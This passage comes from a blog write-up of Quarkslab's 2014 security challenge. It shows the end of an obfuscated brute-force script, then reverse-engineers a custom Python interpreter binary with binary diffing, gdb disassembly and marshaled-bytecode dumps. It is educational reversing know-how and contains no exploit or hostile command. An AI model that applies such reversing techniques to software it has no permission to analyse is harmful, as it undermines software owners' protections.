</span><span class='line'>                            <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;d&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;d&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">d</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;d&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;d&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">d</span><span class="p">))),</span>
</span><span class='line'>                            <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;i&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>                            <span class="n">x</span>
</span><span class='line'>                        <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>                    <span class="p">)</span>
</span><span class='line'>                    <span class="c"># Returns { &#39;g&#39; : g, &#39;c&#39;, &#39;d&#39;: d, &#39;!&#39;:zip(tab1, tab0), &#39;l&#39;:zip(tab1, tab0), l1&#39;:tab1, &#39;l0&#39;:tab0, &#39;i&#39;: (1371, 1302), &#39;j&#39;: 1302}</span>
</span><span class='line'>                    <span class="p">(</span>
</span><span class='line'>                        <span class="p">(</span>
</span><span class='line'>                            <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                                <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="p">[(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;j&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;j&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">j</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span><span class="p">[</span> <span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;zip&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;zip&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="nb">zip</span><span class="p">)((</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;l0&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l0&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">l0</span><span class="p">),</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;l1&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;l1&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">l1</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;j&#39;</span><span class="p">]</span> <span class="ow">in</span> <span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="s">&#39;i&#39;</span><span class="p">]</span> <span class="k">if</span> <span class="p">(</span><span class="s">&#39;i&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="k">else</span> <span class="n">i</span><span class="p">)]),</span>
</span><span class='line'>                                <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>                                <span class="n">x</span>
</span><span class='line'>                            <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>                        <span class="p">)</span>
</span><span class='line'>                        <span class="c"># Returns { &#39;g&#39; : g, &#39;c&#39;, &#39;d&#39;: d, &#39;!&#39;:tab1, &#39;l1&#39;:tab1, &#39;l0&#39;:tab0}</span>
</span><span class='line'>                        <span class="p">(</span>
</span><span class='line'>                            <span class="p">(</span>
</span><span class='line'>                                <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                                    <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="n">tab1</span><span class="p">),</span>
</span><span class='line'>                                    <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l1&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>                                    <span class="n">x</span>
</span><span class='line'>                                <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>                            <span class="p">)</span>
</span><span class='line'>                            <span class="c"># Return { &#39;g&#39; : g, &#39;c&#39;, &#39;d&#39;: d, &#39;!&#39; : tab0, &#39;l0&#39;:tab0}</span>
</span><span class='line'>                            <span class="p">(</span>
</span><span class='line'>                                <span class="p">(</span>
</span><span class='line'>                                    <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">(</span>
</span><span class='line'>                                        <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;!&#39;</span><span class="p">,</span> <span class="n">tab0</span><span class="p">),</span>
</span><span class='line'>                                        <span class="n">x</span><span class="o">.</span><span class="n">__setitem__</span><span class="p">(</span><span class="s">&#39;l0&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">[</span><span class="s">&#39;!&#39;</span><span class="p">]),</span>
</span><span class='line'>                                        <span class="n">x</span>
</span><span class='line'>                                    <span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'>                                <span class="p">)</span>
</span><span class='line'>                                <span class="p">({</span> <span class="s">&#39;g&#39;</span><span class="p">:</span> <span class="n">g</span><span class="p">,</span> <span class="s">&#39;c&#39;</span><span class="p">:</span> <span class="n">c</span><span class="p">,</span> <span class="s">&#39;d&#39;</span><span class="p">:</span> <span class="n">d</span><span class="p">,</span> <span class="s">&#39;$&#39;</span><span class="p">:</span> <span class="bp">None</span><span class="p">})</span>
</span><span class='line'>                            <span class="p">)</span>
</span><span class='line'>                        <span class="p">)</span>
</span><span class='line'>                    <span class="p">)</span>
</span><span class='line'>                <span class="p">)</span>
</span><span class='line'>            <span class="p">)</span>
</span><span class='line'>        <span class="p">)[</span><span class="s">&#39;$&#39;</span><span class="p">]</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">):</span>
</span><span class='line'>        <span class="k">try</span><span class="p">:</span>
</span><span class='line'>            <span class="n">ret</span> <span class="o">=</span> <span class="n">func</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>            <span class="k">if</span> <span class="s">&#39;quarks&#39;</span> <span class="ow">in</span> <span class="n">ret</span><span class="p">:</span>
</span><span class='line'>                <span class="k">print</span> <span class="n">ret</span>
</span><span class='line'>        <span class="k">except</span><span class="p">:</span>
</span><span class='line'>            <span class="k">pass</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="n">main</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">),</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>And after running it, we are good to go:</p>

<figure class='code'><figcaption><span>w00tw00t</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>D:\Codes\challenges\ql-python&gt;bf_with_lambdas_cleaned.py
</span><span class='line'>/blog.quarkslab.com/static/resources/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span></code></pre></td></tr></table></div></figure>


<h1>A custom ELF64 Python interpreter you shall debug</h1>

<h2>Recon</h2>

<p>All right, here we are: we now have the real challenge. First, let&rsquo;s see what kind of information we get for free:</p>

<figure class='code'><figcaption><span>recon</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>overclok@wildout:~/chall/ql-py<span class="nv">$ </span>file b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf: ELF 64-bit LSB  executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>,
</span><span class='line'><span class="k">for </span>GNU/Linux 2.6.26, not stripped
</span><span class='line'>overclok@wildout:~/chall/ql-py<span class="nv">$ </span>ls -lah b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>-rwxrw-r-x 1 overclok overclok 7.9M Sep  8 21:03 b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span></code></pre></td></tr></table></div></figure>


<p>The binary is quite big, not good for us. But on the other hand, the binary isn&rsquo;t stripped so we might find useful debugging information at some point.</p>

<figure class='code'><figcaption><span>./b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>overclok@wildout:~/chall/ql-py<span class="nv">$ </span>/usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>Python 2.7.8+ <span class="o">(</span>nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46<span class="o">)</span>
</span><span class='line'><span class="o">[</span>GCC 4.8.2<span class="o">]</span> on linux2
</span><span class='line'>Type <span class="s2">&quot;help&quot;</span>, <span class="s2">&quot;copyright&quot;</span>, <span class="s2">&quot;credits&quot;</span> or <span class="s2">&quot;license&quot;</span> <span class="k">for </span>more information.
</span><span class='line'>&gt;&gt;&gt;
</span></code></pre></td></tr></table></div></figure>


<p>That does explain the size of the binary then: we basically have something that looks like a custom Python interpreter. Note that I also remembered reading <em><a href="http://blog.quarkslab.com/building-an-obfuscated-python-interpreter-we-need-more-opcodes.html">Building an obfuscated Python interpreter: we need more opcodes</a></em> on <em>Quarkslab</em>&rsquo;s blog where Serge described how you could tweak the interpreter sources to add / change some opcodes either for optimization or obfuscation purposes.</p>

<h2>Finding the interesting bits</h2>

<p>The next step is to figure out what part of the binary is interesting, what functions have been modified, and where we find the problem we need to solve to get the flag. My idea for that was to use a <em>binary-diffing</em> tool between an original <em>Python278</em> interpreter and the one we were given.</p>

<p>To do so I just grabbed <em>Python278</em>&rsquo;s sources and compiled them by myself:</p>

<figure class='code'><figcaption><span>compiling Py278</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>overclok@wildout:~/chall/ql-py<span class="nv">$ </span>wget https://www.python.org/ftp/python/2.7.8/Python-2.7.8.tgz <span class="o">&amp;&amp;</span> tar xzvf Python-2.7.8.tgz
</span><span class='line'>overclok@wildout:~/chall/ql-py<span class="nv">$ </span>tar xzvf Python-2.7.8.tgz
</span><span class='line'>overclok@wildout:~/chall/ql-py<span class="nv">$ </span><span class="nb">cd </span>Python-2.7.8/ <span class="o">&amp;&amp;</span> ./configure <span class="o">&amp;&amp;</span> make
</span><span class='line'>overclok@wildout:~/chall/ql-py/Python-2.7.8<span class="nv">$ </span>ls -lah ./python
</span><span class='line'>-rwxrwxr-x 1 overclok overclok 8.0M Sep  5 00:13 ./python
</span></code></pre></td></tr></table></div></figure>


<p>The resulting binary has a similar size, so it should do the job even if I&rsquo;m not using <em>GCC 4.8.2</em> and the same compilation/optimization options. To perform the <em>diffing</em> I used <em>IDA Pro</em> and <a href="https://code.google.com/p/patchdiff2/">Patchdiff v2.0.10</a>.</p>

<figure class='code'><figcaption><span>Patchdiff result</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>---------------------------------------------------
</span><span class='line'>PatchDiff Plugin v2.0.10
</span><span class='line'>Copyright (c) 2010-2011, Nicolas Pouvesle
</span><span class='line'>Copyright (C) 2007-2009, Tenable Network Security, Inc
</span><span class='line'>---------------------------------------------------
</span><span class='line'>
</span><span class='line'>Scanning for functions ...
</span><span class='line'>parsing second idb...
</span><span class='line'>parsing first idb...
</span><span class='line'>diffing...
</span><span class='line'>Identical functions:   2750
</span><span class='line'>Matched functions:     176
</span><span class='line'>Unmatched functions 1: 23
</span><span class='line'>Unmatched functions 2: 85
</span><span class='line'>done!
</span></code></pre></td></tr></table></div></figure>


<p>Once the tool has finished its analysis we just have to check the list of unmatched function names (around one hundred of them, so it&rsquo;s pretty quick), and eventually we see that:</p>

<p><img class="center" src="http://doar-e.github.io/images/dissection_of_quarkslab_s_2014_security_challenge/initdo_not_run_me.png"></p>

<p>That function directly caught my eyes (you can even check it doesn&rsquo;t exist in the <em>Python278</em> source tree obviously :&ndash;)), and it appears this function is just setting up a Python module called <em>do_not_run_me</em>.</p>

<p><img class="center" src="http://doar-e.github.io/images/dissection_of_quarkslab_s_2014_security_challenge/initdonotrunme_assembly.png"></p>

<p>Let&rsquo;s import it:</p>

<figure class='code'><figcaption><span>do_not_run_me module</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">overclok</span><span class="nd">@wildout</span><span class="p">:</span><span class="o">~/</span><span class="n">chall</span><span class="o">/</span><span class="n">ql</span><span class="o">-</span><span class="n">py</span><span class="err">$</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf</span>
</span><span class='line'><span class="n">iPython</span> <span class="mf">2.7</span><span class="o">.</span><span class="mi">8</span><span class="o">+</span> <span class="p">(</span><span class="n">nvcs</span><span class="o">/</span><span class="n">newopcodes</span><span class="p">:</span><span class="n">a9bd62e4d5f2</span><span class="o">+</span><span class="p">,</span> <span class="n">Sep</span>  <span class="mi">1</span> <span class="mi">2014</span><span class="p">,</span> <span class="mi">11</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">46</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="n">GCC</span> <span class="mf">4.8</span><span class="o">.</span><span class="mi">2</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux2</span>
</span><span class='line'><span class="n">Type</span> <span class="s">&quot;help&quot;</span><span class="p">,</span> <span class="s">&quot;copyright&quot;</span><span class="p">,</span> <span class="s">&quot;credits&quot;</span> <span class="ow">or</span> <span class="s">&quot;license&quot;</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="o">.</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">do_not_run_me</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">do_not_run_me</span><span class="o">.</span><span class="n">__doc__</span>
</span><span class='line'><span class="bp">None</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="nb">dir</span><span class="p">(</span><span class="n">do_not_run_me</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="s">&#39;__doc__&#39;</span><span class="p">,</span> <span class="s">&#39;__name__&#39;</span><span class="p">,</span> <span class="s">&#39;__package__&#39;</span><span class="p">,</span> <span class="s">&#39;run_me&#39;</span><span class="p">]</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">do_not_run_me</span><span class="o">.</span><span class="n">run_me</span><span class="o">.</span><span class="n">__doc__</span>
</span><span class='line'><span class="n">There</span> <span class="n">are</span> <span class="n">two</span> <span class="n">kinds</span> <span class="n">of</span> <span class="n">people</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">world</span><span class="p">:</span> <span class="n">those</span> <span class="n">who</span> <span class="n">say</span> <span class="n">there</span> <span class="ow">is</span> <span class="n">no</span> <span class="n">such</span> <span class="n">thing</span> <span class="k">as</span> <span class="n">infinite</span> <span class="n">recursion</span><span class="p">,</span> <span class="ow">and</span> <span class="n">those</span> <span class="n">who</span> <span class="n">say</span> <span class="sb">``</span><span class="n">There</span> <span class="n">are</span> <span class="n">two</span> <span class="n">kinds</span> <span class="n">of</span> <span class="n">people</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">world</span><span class="p">:</span> <span class="n">those</span> <span class="n">who</span> <span class="n">say</span> <span class="n">there</span> <span class="ow">is</span> <span class="n">no</span> <span class="n">such</span> <span class="n">thing</span> <span class="k">as</span> <span class="n">infinite</span> <span class="n">recursion</span><span class="p">,</span> <span class="ow">and</span> <span class="n">those</span> <span class="n">who</span> <span class="n">say</span> <span class="o">...</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">do_not_run_me</span><span class="o">.</span><span class="n">run_me</span><span class="p">(</span><span class="s">&#39;doar-e&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">Segmentation</span> <span class="n">fault</span>
</span></code></pre></td></tr></table></div></figure>


<p>All right, we now have something to look at and we are going to do so from a low level point of view because that&rsquo;s what I like ; so don&rsquo;t expect big/magic hacks here :).</p>

<p>If you are not really familiar with Python&rsquo;s VM structures I would advise you to read quickly through this article <em><a href="https://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/">Deep Dive Into Python’s VM: Story of LOAD_CONST Bug</a></em>, and you should be all set for the next parts.</p>

<h2>do_not_run_me.run_me</h2>

<p>The function is quite small, so it should be pretty quick to analyze:</p>

<ol>
<li>the first part makes sure that we pass a string as an argument when calling <em>run_me</em>,</li>
<li>then a custom <em>marshaled</em> function is loaded, a function is created out of it, and called,</li>
<li>after that it creates another function from the string we pass to the function (which explains the <em>segfault</em> just above),</li>
<li>finally, a last function is created from another hardcoded <em>marshaled</em> string.</li>
</ol>


<h3>First marshaled function</h3>

<p>To understand it we have to dump it first, to unmarshal it and to analyze the resulting code object:</p>

<figure class='code'><figcaption><span>unmarshaling the first function</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>overclok@wildout:~/chall/ql-py$ gdb -q /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>Reading symbols from /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf...done.
</span><span class='line'>gdb$ set disassembly-flavor intel
</span><span class='line'>gdb$ disass run_me
</span><span class='line'>Dump of assembler code for function run_me:
</span><span class='line'>   0x0000000000513d90 &lt;+0&gt;:     push   rbp
</span><span class='line'>   0x0000000000513d91 &lt;+1&gt;:     mov    rdi,rsi
</span><span class='line'>   0x0000000000513d94 &lt;+4&gt;:     xor    eax,eax
</span><span class='line'>   0x0000000000513d96 &lt;+6&gt;:     mov    esi,0x56c70b
</span><span class='line'>   0x0000000000513d9b &lt;+11&gt;:    push   rbx
</span><span class='line'>   0x0000000000513d9c &lt;+12&gt;:    sub    rsp,0x28
</span><span class='line'>   0x0000000000513da0 &lt;+16&gt;:    lea    rcx,[rsp+0x10]
</span><span class='line'>   0x0000000000513da5 &lt;+21&gt;:    mov    rdx,rsp
</span><span class='line'>
</span><span class='line'>   ; Parses the arguments we gave, it expects a string object
</span><span class='line'>   0x0000000000513da8 &lt;+24&gt;:    call   0x4cf430 &lt;PyArg_ParseTuple&gt;
</span><span class='line'>   0x0000000000513dad &lt;+29&gt;:    xor    edx,edx
</span><span class='line'>   0x0000000000513daf &lt;+31&gt;:    test   eax,eax
</span><span class='line'>   0x0000000000513db1 &lt;+33&gt;:    je     0x513e5e &lt;run_me+206&gt;
</span><span class='line'>
</span><span class='line'>   0x0000000000513db7 &lt;+39&gt;:    mov    rax,QWORD PTR [rip+0x2d4342]
</span><span class='line'>   0x0000000000513dbe &lt;+46&gt;:    mov    esi,0x91
</span><span class='line'>   0x0000000000513dc3 &lt;+51&gt;:    mov    edi,0x56c940
</span><span class='line'>   0x0000000000513dc8 &lt;+56&gt;:    mov    rax,QWORD PTR [rax+0x10]
</span><span class='line'>   0x0000000000513dcc &lt;+60&gt;:    mov    rbx,QWORD PTR [rax+0x30]
</span><span class='line'>
</span><span class='line'>   ; Creates a code object from the marshaled string
</span><span class='line'>   ; PyObject* PyMarshal_ReadObjectFromString(char *string, Py_ssize_t len)
</span><span class='line'>   0x0000000000513dd0 &lt;+64&gt;:    call   0x4dc020 &lt;PyMarshal_ReadObjectFromString&gt;
</span><span class='line'>   0x0000000000513dd5 &lt;+69&gt;:    mov    rdi,rax
</span><span class='line'>   0x0000000000513dd8 &lt;+72&gt;:    mov    rsi,rbx
</span><span class='line'>
</span><span class='line'>   ; Creates a function object from the marshaled string
</span><span class='line'>   0x0000000000513ddb &lt;+75&gt;:    call   0x52c630 &lt;PyFunction_New&gt;
</span><span class='line'>   0x0000000000513de0 &lt;+80&gt;:    xor    edi,edi
</span><span class='line'>[...]
</span><span class='line'>gdb$ r -c &#39;import do_not_run_me as v; v.run_me(&quot;&quot;)&#39;
</span><span class='line'>Starting program: /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf -c &#39;import do_not_run_me as v; v.run_me(&quot;&quot;)&#39;
</span><span class='line'>[...]
</span></code></pre></td></tr></table></div></figure>


<p>To start, we can set two software breakpoints <em>@0x0000000000513dd0</em> and <em>@0x0000000000513dd5</em> to inspect both the marshaled string and the resulting code object.</p>

<p>Just a little reminder though on the <em>Linux/x64 ABI</em>: &ldquo;The first six integer or pointer arguments are passed in registers RDI, RSI, RDX, RCX, R8, and R9&rdquo;.</p>

<figure class='code'><figcaption><span>unmarshaled string inspection</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>gdb$ p /x $rsi
</span><span class='line'>$2 = 0x91
</span><span class='line'>gdb$ x/145bx $rdi
</span><span class='line'>0x56c940 &lt;+00&gt;:  0x63    0x00    0x00    0x00    0x00    0x01    0x00    0x00
</span><span class='line'>0x56c948 &lt;+08&gt;:  0x00    0x02    0x00    0x00    0x00    0x43    0x00    0x00
</span><span class='line'>0x56c950 &lt;+16&gt;:  0x00    0x73    0x14    0x00    0x00    0x00    0x64    0x01
</span><span class='line'>0x56c958 &lt;+24&gt;:  0x00    0x87    0x00    0x00    0x7c    0x00    0x00    0x64
</span><span class='line'>0x56c960 &lt;+32&gt;:  0x01    0x00    0x3c    0x61    0x00    0x00    0x7c    0x00
</span><span class='line'>0x56c968 &lt;+40&gt;:  0x00    0x1b    0x28    0x02    0x00    0x00    0x00    0x4e
</span><span class='line'>0x56c970 &lt;+48&gt;:  0x69    0x01    0x00    0x00    0x00    0x28    0x01    0x00
</span><span class='line'>0x56c978 &lt;+56&gt;:  0x00    0x00    0x74    0x04    0x00    0x00    0x00    0x54
</span><span class='line'>0x56c980 &lt;+64&gt;:  0x72    0x75    0x65    0x28    0x01    0x00    0x00    0x00
</span><span class='line'>0x56c988 &lt;+72&gt;:  0x74    0x0e    0x00    0x00    0x00    0x52    0x6f    0x62
</span><span class='line'>0x56c990 &lt;+80&gt;:  0x65    0x72    0x74    0x5f    0x46    0x6f    0x72    0x73
</span><span class='line'>0x56c998 &lt;+88&gt;:  0x79    0x74    0x68    0x28    0x00    0x00    0x00    0x00
</span><span class='line'>0x56c9a0 &lt;+96&gt;:  0x28    0x00    0x00    0x00    0x00    0x73    0x10    0x00
</span><span class='line'>0x56c9a8 &lt;+104&gt;: 0x00    0x00    0x6f    0x62    0x66    0x75    0x73    0x63
</span><span class='line'>0x56c9b0 &lt;+112&gt;: 0x61    0x74    0x65    0x2f    0x67    0x65    0x6e    0x2e
</span><span class='line'>0x56c9b8 &lt;+120&gt;: 0x70    0x79    0x74    0x03    0x00    0x00    0x00    0x66
</span><span class='line'>0x56c9c0 &lt;+128&gt;: 0x6f    0x6f    0x05    0x00    0x00    0x00    0x73    0x06
</span><span class='line'>0x56c9c8 &lt;+136&gt;: 0x00    0x00    0x00    0x00    0x01    0x06    0x02    0x0a
</span><span class='line'>0x56c9d0 &lt;+144&gt;: 0x01
</span></code></pre></td></tr></table></div></figure>


<p>And obviously you can&rsquo;t use the Python <em>marshal</em> module to load &amp; inspect the resulting object as the author seems to have removed the methods <em>loads</em> and <em>dumps</em>:</p>

<figure class='code'><figcaption><span>fuu</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>overclok@wildout:~/chall/ql-py$ /usr/bin/b7d8438de09fffb12e3950e7ad4970a4a998403bdf3763dd4178adf
</span><span class='line'>Python 2.7.8+ (nvcs/newopcodes:a9bd62e4d5f2+, Sep  1 2014, 11:41:46)
</span><span class='line'>[GCC 4.8.2] on linux2
</span><span class='line'>Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
</span><span class='line'>&gt;&gt;&gt; import marshal
</span><span class='line'>&gt;&gt;&gt; dir(marshal)
</span><span class='line'>[&#39;__doc__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;version&#39;]
</span></code></pre></td></tr></table></div></figure>


<p>We could still try to run the marshaled string in our fresh compiled original Python though:</p>

<figure class='code'><figcaption><span>unmarshal in an original Python278</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
